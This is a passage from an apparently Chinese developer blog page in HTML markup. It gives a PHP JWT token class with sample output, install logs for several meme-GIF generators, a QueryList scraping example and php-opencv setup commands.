class="string">'alg'</span>=&gt;<span class="string">'HS256'</span>, <span class="comment">//生成signature的算法</span></span><br><span class="line">        <span class="string">'typ'</span>=&gt;<span class="string">'JWT'</span>  <span class="comment">//类型</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//使用HMAC生成信息摘要时所使用的密钥</span></span><br><span class="line">    private <span class="keyword">static</span> $key=<span class="string">'KEY'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取jwt token</span></span><br><span class="line"><span class="comment">     * @param array $payload jwt载荷  格式如下非必须</span></span><br><span class="line"><span class="comment">     * [</span></span><br><span class="line"><span class="comment">     * 'iss'=&gt;'jwt_admin', //该JWT的签发者</span></span><br><span class="line"><span class="comment">     * 'iat'=&gt;time(), //签发时间</span></span><br><span class="line"><span class="comment">     * 'exp'=&gt;time()+7200, //过期时间</span></span><br><span class="line"><span class="comment">     * 'nbf'=&gt;time()+60, //该时间之前不接收处理该Token</span></span><br><span class="line"><span class="comment">     * 'sub'=&gt;'www.admin.com', //面向的用户</span></span><br><span class="line"><span class="comment">     * 'jti'=&gt;md5(uniqid('JWT').time()) //该Token唯一标识</span></span><br><span class="line"><span class="comment">     * ]</span></span><br><span class="line"><span class="comment">     * @return bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params">array $payload</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $arr = [</span><br><span class="line">            <span class="string">'iss'</span>=&gt;<span class="string">'yamecent'</span>, <span class="comment">//该JWT的签发者</span></span><br><span class="line">            <span class="string">'iat'</span>=&gt;time(), <span class="comment">//签发时间</span></span><br><span class="line">            <span class="string">'exp'</span>=&gt;time()+<span class="number">3600</span>*<span class="number">24</span>*<span class="number">15</span>, <span class="comment">//过期时间</span></span><br><span class="line">            <span class="string">'nbf'</span>=&gt;time(), <span class="comment">//该时间之前不接收处理该Token</span></span><br><span class="line">            <span class="string">'sub'</span>=&gt;<span class="string">''</span>, <span class="comment">//面向的用户</span></span><br><span class="line">            <span class="string">'jti'</span>=&gt;md5(uniqid(<span class="string">'JWT'</span>).time()) <span class="comment">//该Token唯一标识</span></span><br><span class="line">        ];</span><br><span class="line">        $payload = array_merge($arr,$payload);</span><br><span class="line">        <span class="keyword">if</span>(is_array($payload))</span><br><span class="line">        &#123;</span><br><span class="line">            $base64header=self::base64UrlEncode(json_encode(self::$header,JSON_UNESCAPED_UNICODE));</span><br><span class="line">            $base64payload=self::base64UrlEncode(json_encode($payload,JSON_UNESCAPED_UNICODE));</span><br><span class="line">            $token=$base64header.<span class="string">'.'</span>.$base64payload.<span class="string">'.'</span>.self::signature($base64header.<span class="string">'.'</span>.$base64payload,<span class="attr">self</span>::$key,<span class="attr">self</span>::$header[<span class="string">'alg'</span>]);</span><br><span class="line">            <span class="keyword">return</span> $token;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证token是否有效,默认验证exp,nbf,iat时间</span></span><br><span class="line"><span class="comment">     * @param string $Token 需要验证的token</span></span><br><span class="line"><span class="comment">     * @return bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span>(<span class="params">string $Token</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tokens = explode(<span class="string">'.'</span>, $Token);</span><br><span class="line">        <span class="keyword">if</span> (count($tokens) != <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        list($base64header, $base64payload, $sign) = $tokens;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取jwt算法</span></span><br><span class="line">        $base64decodeheader = json_decode(self::base64UrlDecode($base64header), JSON_OBJECT_AS_ARRAY);</span><br><span class="line">        <span class="keyword">if</span> (empty($base64decodeheader[<span class="string">'alg'</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//签名验证</span></span><br><span class="line">        <span class="keyword">if</span> (self::signature($base64header . <span class="string">'.'</span> . $base64payload, <span class="attr">self</span>::$key, $base64decodeheader[<span class="string">'alg'</span>]) !== $sign)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        $payload = json_decode(self::base64UrlDecode($base64payload), JSON_OBJECT_AS_ARRAY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//签发时间大于当前服务器时间验证失败</span></span><br><span class="line">        <span class="keyword">if</span> (isset($payload[<span class="string">'iat'</span>]) &amp;&amp; $payload[<span class="string">'iat'</span>] &gt; time())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//过期时间小宇当前服务器时间验证失败</span></span><br><span class="line">        <span class="keyword">if</span> (isset($payload[<span class="string">'exp'</span>]) &amp;&amp; $payload[<span class="string">'exp'</span>] &lt; time())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//该nbf时间之前不接收处理该Token</span></span><br><span class="line">        <span class="keyword">if</span> (isset($payload[<span class="string">'nbf'</span>]) &amp;&amp; $payload[<span class="string">'nbf'</span>] &gt; time())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base64UrlEncode  https://jwt.io/ 中base64UrlEncode编码实现</span></span><br><span class="line"><span class="comment">     * @param string $input 需要编码的字符串</span></span><br><span class="line"><span class="comment">     * @return string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span>(<span class="params">string $input</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'='</span>, <span class="string">''</span>, strtr(base64_encode($input), <span class="string">'+/'</span>, <span class="string">'-_'</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base64UrlEncode https://jwt.io/ 中base64UrlEncode解码实现</span></span><br><span class="line"><span class="comment">     * @param string $input 需要解码的字符串</span></span><br><span class="line"><span class="comment">     * @return bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span>(<span class="params">string $input</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $remainder = strlen($input) % <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ($remainder) &#123;</span><br><span class="line">            $addlen = <span class="number">4</span> - $remainder;</span><br><span class="line">            $input .= str_repeat(<span class="string">'='</span>, $addlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> base64_decode(strtr($input, <span class="string">'-_'</span>, <span class="string">'+/'</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * HMACSHA256签名  https://jwt.io/ 中HMACSHA256签名实现</span></span><br><span class="line"><span class="comment">     * @param string $input 为base64UrlEncode(header).".".base64UrlEncode(payload)</span></span><br><span class="line"><span class="comment">     * @param string $key</span></span><br><span class="line"><span class="comment">     * @param string $alg  算法方式</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">signature</span>(<span class="params">string $input, string $key, string $alg = <span class="string">'HS256'</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $alg_config=array(</span><br><span class="line">            <span class="string">'HS256'</span>=&gt;<span class="string">'sha256'</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> self::base64UrlEncode(hash_hmac($alg_config[$alg], $input, $key,<span class="literal">true</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$token = \App\JwtBase::getToken([<span class="string">'user_id'</span>=&gt;<span class="number">666</span>]);<span class="comment">//生成token</span></span><br><span class="line">	$data = \App\JwtBase::verifyToken($token);</span><br><span class="line">	dump($data);</span><br><span class="line">	array:<span class="number">7</span> [▼</span><br><span class="line">      <span class="string">"iss"</span> =&gt; <span class="string">"yamecent"</span></span><br><span class="line">      <span class="string">"iat"</span> =&gt; <span class="number">1547186866</span></span><br><span class="line">      <span class="string">"exp"</span> =&gt; <span class="number">1548482866</span></span><br><span class="line">      <span class="string">"nbf"</span> =&gt; <span class="number">1547186866</span></span><br><span class="line">      <span class="string">"sub"</span> =&gt; <span class="string">""</span></span><br><span class="line">      <span class="string">"jti"</span> =&gt; <span class="string">"fbb7cbfd4f962dfb6ff193e28f09b6e2"</span></span><br><span class="line">      <span class="string">"user_id"</span> =&gt; <span class="number">666</span></span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
<h3 id="php版为所欲为"><a href="#php版为所欲为" class="headerlink" title="php版为所欲为"></a>php版为所欲为</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"># 安装 epel 库，如果以前装过可以不用</span><br><span class="line">yum install -y epel-release</span><br><span class="line"></span><br><span class="line"># 引入 nux.ro 的库</span><br><span class="line">rpm --<span class="keyword">import</span> http:<span class="comment">//li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro  </span></span><br><span class="line">rpm -Uvh http:<span class="comment">//li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm</span></span><br><span class="line"></span><br><span class="line"># 执行安装</span><br><span class="line">yum install ffmpeg</span><br><span class="line"></span><br><span class="line">摘抄自：https:<span class="comment">//sendya.me/centos-yum-install-ffmpeg-lib/</span></span><br><span class="line">安装字体 https:<span class="comment">//blog.csdn.net/wlwlwlwl015/article/details/51482065</span></span><br><span class="line">git clone https:<span class="comment">//github.com/PrintNow/php-sorry-gif</span></span><br><span class="line">cd php-sorry-gif</span><br><span class="line">ps aux |grep fpm </span><br><span class="line">chown -R nobody:nobody /usr/share/nginx/html/php-sorry-gif/</span><br><span class="line">访问 http:<span class="comment">//118.24.158.116:8888/php-sorry-gif/index.php#weisuoyuwei</span></span><br><span class="line"></span><br><span class="line">js 版</span><br><span class="line">$ git clone https:<span class="comment">//github.com/WincerChan/Meme-generator</span></span><br><span class="line">Cloning into <span class="string">'Meme-generator'</span>...</span><br><span class="line">remote: Enumerating objects: <span class="number">30</span>, done.</span><br><span class="line">remote: Counting objects: <span class="number">100</span>% (<span class="number">30</span>/<span class="number">30</span>), done.</span><br><span class="line">remote: Compressing objects: <span class="number">100</span>% (<span class="number">23</span>/<span class="number">23</span>), done.</span><br><span class="line">remote: Total <span class="number">488</span> (delta <span class="number">13</span>), reused <span class="number">22</span> (delta <span class="number">7</span>), pack-reused <span class="number">458</span></span><br><span class="line">Receiving objects: <span class="number">100</span>% (<span class="number">488</span>/<span class="number">488</span>), <span class="number">7.50</span> MiB | <span class="number">545.00</span> KiB/s, done.</span><br><span class="line">Resolving deltas: <span class="number">100</span>% (<span class="number">280</span>/<span class="number">280</span>), done.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ cd Meme-generator/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ yarn install</span><br><span class="line">yarn install v1<span class="number">.9</span><span class="number">.4</span></span><br><span class="line">[<span class="number">1</span>/<span class="number">4</span>] Resolving packages...</span><br><span class="line">[<span class="number">2</span>/<span class="number">4</span>] Fetching packages...</span><br><span class="line">info fsevents@<span class="number">1.2</span><span class="number">.4</span>: The platform <span class="string">"win32"</span> is incompatible <span class="keyword">with</span> <span class="keyword">this</span> <span class="built_in">module</span>.</span><br><span class="line">info <span class="string">"fsevents@1.2.4"</span> is an optional dependency and failed compatibility check. Excluding it <span class="keyword">from</span> installation.</span><br><span class="line">[<span class="number">3</span>/<span class="number">4</span>] Linking dependencies...</span><br><span class="line">[<span class="number">4</span>/<span class="number">4</span>] Building fresh packages...</span><br><span class="line">Done <span class="keyword">in</span> <span class="number">50.18</span>s.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ yarn start</span><br><span class="line">yarn run v1<span class="number">.9</span><span class="number">.4</span></span><br><span class="line">$ react-scripts start</span><br><span class="line">Starting the development server...</span><br><span class="line"></span><br><span class="line">Compiled successfully!</span><br><span class="line"></span><br><span class="line">You can now view meme <span class="keyword">in</span> the browser.</span><br><span class="line"></span><br><span class="line">  Local:            http:<span class="comment">//localhost:3000/</span></span><br><span class="line">  On Your Network:  http:<span class="comment">//10.235.51.40:3000/</span></span><br><span class="line"></span><br><span class="line">Note that the development build is not optimized.</span><br><span class="line">To create a production build, use yarn build.</span><br><span class="line"></span><br><span class="line">python 版</span><br><span class="line"></span><br><span class="line">$ pip install flask pillow imageio ffmpeg-python moviepy</span><br><span class="line">Requirement already satisfied: flask <span class="keyword">in</span> d:\python\lib\site-packages (<span class="number">0.12</span><span class="number">.4</span>)</span><br><span class="line">Collecting pillow</span><br><span class="line">  Downloading https:<span class="comment">//files.pythonhosted.org/packages/d7/ea/46fd5bd57c5df5a2e79e508294acec4be0fcc2fb3ce95c2cf1038ebaa533/Pillow-5.4.1-cp37-cp37m-win32.whl (1.7MB)</span></span><br><span class="line">Collecting imageio</span><br><span class="line">  Downloading https:<span class="comment">//files.pythonhosted.org/packages/28/b4/cbb592964dfd71a9de6a5b08f882fd334fb99ae09ddc82081dbb2f718c81/imageio-2.4.1.tar.gz (3.3MB)</span></span><br><span class="line">Collecting ffmpeg-python</span><br><span class="line">  Downloading https:<span class="comment">//files.pythonhosted.org/packages/3d/10/330cbc8e63d072d40413f4d470444a6a1e8c8c6a80b2a4ac302d1252ca1b/ffmpeg_python-0.1.17-py3-none-any.whl</span></span><br><span class="line">Collecting moviepy</span><br><span class="line">  Downloading https:<span class="comment">//files.pythonhosted.org/packages/1f/af/98b68b047c47d9430cb4c9ac899cf9d969de3936f888072991ea74da93a8/moviepy-0.2.3.5.tar.gz (372kB)</span></span><br><span class="line">Requirement already satisfied: click&gt;=<span class="number">2.0</span> <span class="keyword">in</span> d:\python\lib\site-packages (<span class="keyword">from</span> flask) (<span class="number">6.7</span>)</span><br><span class="line">Requirement already satisfied: Jinja2&gt;=<span class="number">2.4</span> <span class="keyword">in</span> d:\python\lib\site-packages (<span class="keyword">from</span> flask) (<span class="number">2.10</span>)</span><br><span class="line">Requirement already satisfied: Werkzeug&gt;=<span class="number">0.7</span> <span class="keyword">in</span> d:\python\lib\site-packages (<span class="keyword">from</span> flask) (<span class="number">0.14</span><span class="number">.1</span>)</span><br><span class="line">Requirement already satisfied: itsdangerous&gt;=<span class="number">0.21</span> <span class="keyword">in</span> d:\python\lib\site-packages (<span class="keyword">from</span> flask) (<span class="number">0.24</span>)</span><br><span class="line">Requirement already satisfied: numpy <span class="keyword">in</span> d:\python\lib\site-packages (<span class="keyword">from</span> imageio) (<span class="number">1.15</span><span class="number">.1</span>)</span><br><span class="line">Requirement already satisfied: future <span class="keyword">in</span> d:\python\lib\site-packages (<span class="keyword">from</span> ffmpeg-python) (<span class="number">0.16</span><span class="number">.0</span>)</span><br><span class="line">Requirement already satisfied: decorator&lt;<span class="number">5.0</span>,&gt;=<span class="number">4.0</span><span class="number">.2</span> <span class="keyword">in</span> d:\python\lib\site-packages (<span class="keyword">from</span> moviepy) (<span class="number">4.3</span><span class="number">.0</span>)</span><br><span class="line">Collecting tqdm&lt;<span class="number">5.0</span>,&gt;=<span class="number">4.11</span><span class="number">.2</span> (<span class="keyword">from</span> moviepy)</span><br><span class="line">  Downloading https:<span class="comment">//files.pythonhosted.org/packages/d1/f9/8cbd36ef8bf84c5281e4943eaa12fe34850a0e8204e44872d8ca0c0ec741/tqdm-4.29.0-py2.py3-none-any.whl (46kB)</span></span><br><span class="line">Requirement already satisfied: MarkupSafe&gt;=<span class="number">0.23</span> <span class="keyword">in</span> d:\python\lib\site-packages (<span class="keyword">from</span> Jinja2&gt;=<span class="number">2.4</span>-&gt;flask) (<span class="number">1.0</span>)</span><br><span class="line">Building wheels <span class="keyword">for</span> collected packages: imageio, moviepy</span><br><span class="line">  Running setup.py bdist_wheel <span class="keyword">for</span> imageio: started</span><br><span class="line">  Running setup.py bdist_wheel <span class="keyword">for</span> imageio: finished <span class="keyword">with</span> status <span class="string">'done'</span></span><br><span class="line">  Stored <span class="keyword">in</span> directory: C:\Users\suping3\AppData\Local\pip\Cache\wheels\e0\<span class="number">43</span>\<span class="number">31</span>\<span class="number">605</span>de9372ceaf657f152d3d5e82f42cf265d81db8bbe63cde1</span><br><span class="line">  Running setup.py bdist_wheel <span class="keyword">for</span> moviepy: started</span><br><span class="line">  Running setup.py bdist_wheel <span class="keyword">for</span> moviepy: finished <span class="keyword">with</span> status <span class="string">'done'</span></span><br><span class="line">  Stored <span class="keyword">in</span> directory: C:\Users\suping3\AppData\Local\pip\Cache\wheels\ad\<span class="number">92</span>\<span class="number">4</span>d\a6c6307d4c2219d002646bd4a5987e31fd5697f6ea7778b2c0</span><br><span class="line">Successfully built imageio moviepy</span><br><span class="line">Installing collected packages: pillow, imageio, ffmpeg-python, tqdm, moviepy</span><br><span class="line">Successfully installed ffmpeg-python<span class="number">-0.1</span><span class="number">.17</span> imageio<span class="number">-2.4</span><span class="number">.1</span> moviepy<span class="number">-0.2</span><span class="number">.3</span><span class="number">.5</span> pillow<span class="number">-5.4</span><span class="number">.1</span> tqdm<span class="number">-4.29</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">suping3@BJ-D<span class="number">-212361</span>A MINGW64 /d/code/Meme-generator (master)</span><br><span class="line">$ cd ..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ git clone https:<span class="comment">//github.com/East196/sorrypy</span></span><br><span class="line">Cloning into <span class="string">'sorrypy'</span>...</span><br><span class="line">remote: Enumerating objects: <span class="number">136</span>, done.</span><br><span class="line">remote: Total <span class="number">136</span> (delta <span class="number">0</span>), reused <span class="number">0</span> (delta <span class="number">0</span>), pack-reused <span class="number">136</span></span><br><span class="line">Receiving objects: <span class="number">100</span>% (<span class="number">136</span>/<span class="number">136</span>), <span class="number">27.71</span> MiB | <span class="number">230.00</span> KiB/s, done.</span><br><span class="line">Resolving deltas: <span class="number">100</span>% (<span class="number">55</span>/<span class="number">55</span>), done.</span><br><span class="line">Checking out files: <span class="number">100</span>% (<span class="number">48</span>/<span class="number">48</span>), done.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ cd sorrypy/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ python app.py</span><br><span class="line"> * Restarting <span class="keyword">with</span> stat</span><br><span class="line"> * Debugger is active!</span><br><span class="line"> * Debugger PIN: <span class="number">139</span><span class="number">-127</span><span class="number">-258</span></span><br><span class="line"> * Running on http:<span class="comment">//127.0.0.1:8000/ (Press CTRL+C to quit)</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - - [<span class="number">11</span>/Jan/<span class="number">2019</span> <span class="number">17</span>:<span class="number">17</span>:<span class="number">43</span>] <span class="string">"GET / HTTP/1.1"</span> <span class="number">302</span> -</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">DEBUG <span class="keyword">in</span> app [app.py:<span class="number">18</span>]:</span><br><span class="line">sorry</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - - [<span class="number">11</span>/Jan/<span class="number">2019</span> <span class="number">17</span>:<span class="number">17</span>:<span class="number">43</span>] <span class="string">"GET /tpl/sorry/ HTTP/1.1"</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - - [<span class="number">11</span>/Jan/<span class="number">2019</span> <span class="number">17</span>:<span class="number">17</span>:<span class="number">43</span>] <span class="string">"GET /static/w3.css HTTP/1.1"</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - - [<span class="number">11</span>/Jan/<span class="number">2019</span> <span class="number">17</span>:<span class="number">17</span>:<span class="number">43</span>] <span class="string">"GET /static/cookies.js HTTP/1.1"</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - - [<span class="number">11</span>/Jan/<span class="number">2019</span> <span class="number">17</span>:<span class="number">17</span>:<span class="number">43</span>] <span class="string">"GET /static/main.js HTTP/1.1"</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - - [<span class="number">11</span>/Jan/<span class="number">2019</span> <span class="number">17</span>:<span class="number">17</span>:<span class="number">43</span>] <span class="string">"GET /static/sorry/template.mp4 HTTP/1.1"</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - - [<span class="number">11</span>/Jan/<span class="number">2019</span> <span class="number">17</span>:<span class="number">17</span>:<span class="number">43</span>] <span class="string">"GET /favicon.ico HTTP/1.1"</span> <span class="number">404</span> -</span><br></pre></td></tr></table></figure>
<h3 id="采集数据"><a href="#采集数据" class="headerlink" title="采集数据"></a>采集数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> jaeger/querylist</span><br><span class="line">use QL\QueryList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//采集某页面所有的图片</span></span><br><span class="line">$data = QueryList::get(<span class="string">'http://cms.querylist.cc/bizhi/453.html'</span>)-&gt;find(<span class="string">'img'</span>)-&gt;attrs(<span class="string">'src'</span>);</span><br><span class="line"><span class="comment">//打印结果</span></span><br><span class="line">print_r($data-&gt;all());</span><br><span class="line">array:<span class="number">38</span> [▼</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="string">"/dedemao/images/logo.png"</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="string">"/dedemao/ad/top.png"</span></span><br><span class="line">  <span class="number">2</span> =&gt; <span class="string">"/dedemao/ad/article_ad1.jpg"</span></span><br><span class="line">  <span class="number">3</span> =&gt; <span class="string">"http://img.ithome.com/newsuploadfiles/2013/8/20130828_083615_449.jpg"</span></span><br><span class="line"><span class="comment">//采集某页面所有的超链接和超链接文本内容</span></span><br><span class="line"><span class="comment">//可以先手动获取要采集的页面源码</span></span><br><span class="line">$html = file_get_contents(<span class="string">'http://cms.querylist.cc/google/list_1.html'</span>);</span><br><span class="line"><span class="comment">//然后可以把页面源码或者HTML片段传给QueryList</span></span><br><span class="line">$data = QueryList::html($html)-&gt;rules([  <span class="comment">//设置采集规则</span></span><br><span class="line">    <span class="comment">// 采集所有a标签的href属性</span></span><br><span class="line">    <span class="string">'link'</span> =&gt; [<span class="string">'a'</span>,<span class="string">'href'</span>],</span><br><span class="line">    <span class="comment">// 采集所有a标签的文本内容</span></span><br><span class="line">    <span class="string">'text'</span> =&gt; [<span class="string">'a'</span>,<span class="string">'text'</span>]</span><br><span class="line">])-&gt;query()-&gt;getData();</span><br><span class="line"><span class="comment">//打印结果</span></span><br><span class="line">print_r($data-&gt;all());</span><br><span class="line">array:<span class="number">186</span> [▼</span><br><span class="line">  <span class="number">0</span> =&gt; array:<span class="number">2</span> [▼</span><br><span class="line">    <span class="string">"link"</span> =&gt; <span class="string">"/"</span></span><br><span class="line">    <span class="string">"text"</span> =&gt; <span class="string">""</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="number">1</span> =&gt; array:<span class="number">2</span> [▼</span><br><span class="line">    <span class="string">"link"</span> =&gt; <span class="string">"/"</span></span><br><span class="line">    <span class="string">"text"</span> =&gt; <span class="string">"首页"</span></span><br><span class="line">  ]</span><br></pre></td></tr></table></figure>
<p>###<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">docker pull hihozhou/opencv</span><br><span class="line">git clone https:<span class="comment">//github.com/hihozhou/php-opencv.git</span></span><br><span class="line">cd php-opencv</span><br><span class="line">phpize</span><br><span class="line">./configure --<span class="keyword">with</span>-php-config=your php-config path</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">use <span class="function"><span class="keyword">function</span> <span class="title">CV</span>\</span>&#123; imread, imshow, waitkey, namedWindow&#125;;</span><br><span class="line"></span><br><span class="line">$im = imread(<span class="string">'Obama.png'</span>);<span class="comment">//load image</span></span><br><span class="line">namedWindow(<span class="string">'This is Obama id card'</span>,WINDOW_FULLSCREEN);<span class="comment">//create window</span></span><br><span class="line">imshow(<span class="string">'This is Obama id card'</span>,$im);<span class="comment">//show image on window</span></span><br><span class="line"></span><br><span class="line">waitkey(<span class="number">0</span>);</span><br><span class="line">$gray = imread(<span class="string">'Obama.png'</span>,IMREAD_GRAYSCALE);</span><br><span class="line"><span class="comment">//or</span></span><br><span class="line">use  <span class="function"><span class="keyword">function</span> <span class="title">CV</span>\</span>&#123; cvtColor&#125;;</span><br><span class="line">$gray = cvtColor($im, COLOR_BGR2GRAY);</span><br></pre></td></tr></table></figure></p>
